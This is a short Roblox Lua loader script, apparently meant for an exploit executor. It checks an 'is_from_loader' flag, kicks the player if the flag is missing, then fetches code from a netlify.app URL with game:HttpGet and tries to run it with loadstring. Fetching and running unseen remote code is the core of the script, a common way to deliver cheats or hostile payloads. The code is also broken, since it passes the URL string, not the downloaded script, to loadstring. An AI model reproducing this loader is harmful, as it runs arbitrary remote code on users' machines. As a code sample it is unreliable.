local b = "8Gb471nh37Ghg9821-cache"
local c = "https://k4sii.netlify.app/files/v3/l" .. b .. ".lua"


if not is_from_loader then
    
    LocalPlayer:Kick("You must use the loader to run this script.")
    return
end

-- Intenta cargar el script desde la URL
local success, script = pcall(function()
    return game:HttpGet(c)
end)


if success then
    
    loadstring(c)()
else

    LocalPlayer:Kick("Failed to load the script.")
end
